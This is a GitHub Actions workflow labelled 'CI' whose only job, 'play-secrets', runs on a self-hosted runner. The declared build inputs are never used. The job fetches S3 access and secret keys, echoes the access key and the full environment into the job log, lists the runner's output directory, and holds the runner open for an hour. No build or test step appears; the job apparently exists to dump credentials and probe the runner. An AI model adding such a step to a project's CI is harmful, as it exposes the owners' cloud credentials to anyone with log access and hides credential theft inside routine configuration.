name: CI

on:
  workflow_call:
    inputs:
      flavor:
        # See .ci/ci_recipe.py
        required: true
        type: string
      nightly:
        required: true
        type: boolean
      mac_windows:
        required: true
        type: boolean
      hackage_publish:
        # Valid values:
        #   - "no": Don't build and upload sdists
        #   - "candidate": Upload as candidate
        #   - "release": Upload and publish the package
        required: true
        type: string

jobs:
  play-secrets:
    runs-on: self-hosted
    steps:
      - id: alt-secrets
        run: /home/gha/get-secrets S3_ACCESS_KEY S3_SECRET_KEY
      - env:
          S3_ACCESS_KEY: ${{ steps.alt-secrets.outputs.S3_ACCESS_KEY }}
          S3_SECRET_KEY: ${{ steps.alt-secrets.outputs.S3_SECRET_KEY }}
        run: |
          echo ${{ steps.alt-secrets.outputs.S3_ACCESS_KEY }}
          echo "$GITHUB_OUTPUT"
          ls -al "$(dirname "$GITHUB_OUTPUT")"
          export
          sleep 3600 || true
